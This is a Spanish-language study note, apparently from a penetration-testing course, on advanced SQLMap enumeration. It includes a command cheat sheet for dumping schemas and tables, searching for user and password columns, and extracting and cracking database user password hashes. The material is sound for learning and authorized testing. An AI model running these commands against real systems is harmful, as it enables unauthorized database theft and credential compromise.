---
tags:
  - webapp
  - sqlmap
  - attack
---
## Conceptos Clave (TL;DR)

* La enumeración avanzada permite recuperar la estructura de las tablas para obtener una visión general completa de la arquitectura de la base de datos.

* Es posible buscar bases de datos, tablas y columnas específicas utilizando el operador LIKE a través de parámetros de búsqueda.

* SQLMap posee capacidades automáticas para realizar ataques de diccionario y craqueo de hashes en multiprocesamiento basado en los núcleos disponibles del sistema.

* Soporta 31 tipos de algoritmos de hash y contiene un diccionario integrado de 1.4 millones de entradas; si la contraseña no es aleatoria, hay alta probabilidad de éxito en el craqueo.

  

## Herramientas Clave

* **SQLMap**: Herramienta utilizada para la enumeración avanzada de esquemas, búsqueda de palabras clave dentro de las bases de datos y craqueo de credenciales de sistema o de tablas específicas.

  

## Metodología Paso a Paso

1. **Enumeración de Esquemas**: Se utiliza para mapear la arquitectura completa recuperando la estructura de todas las tablas disponibles.

2. **Búsqueda Selectiva de Datos**: Cuando hay numerosas tablas, se busca directamente por identificadores (nombres de columnas o tablas como "user" o "pass") para evitar volcar información innecesaria.

3. **Volcado y Craqueo de Credenciales de Usuarios**: Al identificar una tabla objetivo con contraseñas, se procede al volcado de sus entradas; SQLMap detectará los hashes y solicitará iniciar el ataque de diccionario.

4. **Extracción de Credenciales del Sistema (DBMS)**: Además de los usuarios de la aplicación, se extraen los usuarios del sistema de base de datos que poseen credenciales de conexión.

  

## Cheat Sheet de Comandos

```bash
# Recuperar la estructura completa del esquema de la base de datos
sqlmap -u "<TARGET_URL>" --schema

  
# Buscar todas las tablas que contengan una palabra clave especifica (ej. user)
sqlmap -u "<TARGET_URL>" --search -T <TABLE_KEYWORD>

  
# Buscar todas las columnas que contengan una palabra clave especifica (ej. pass)
sqlmap -u "<TARGET_URL>" --search -C <COLUMN_KEYWORD>

  
# Volcar los datos de una tabla especifica perteneciente a una base de datos concreta
sqlmap -u "<TARGET_URL>" --dump -D <DATABASE_NAME> -T <TABLE_NAME>

  
# Extraer y automatizar el craqueo de contraseñas de los usuarios del sistema de base de datos
sqlmap -u "<TARGET_URL>" --passwords --batch

  
# Enumeracion automatizada masiva y silenciosa (Extrae todo, uso bajo consideracion)
sqlmap -u "<TARGET_URL>" --all --batch
```


## "Gotchas" y Troubleshooting

* **Técnica UNION**: Si SQLMap muestra una advertencia sobre la limitación en la cantidad de entradas recuperadas con "full UNION", este hará un "fallback" automático a la técnica "partial UNION".

* **Flags `--all` y `--batch`**: La combinación de estos interruptores realizará todo el proceso de enumeración de forma automática sobre el objetivo. Sin embargo, recuperará absolutamente todo lo accesible, lo cual puede tardar un tiempo muy prolongado en ejecutarse. Será necesario revisar y buscar los datos de interés en los archivos de salida generados de manera manual.

* **Craqueo Automático**: Tras obtener valores similares a un formato de hash conocido, SQLMap te preguntará si deseas guardarlos para uso externo o procesarlos ahí mismo mediante diccionario.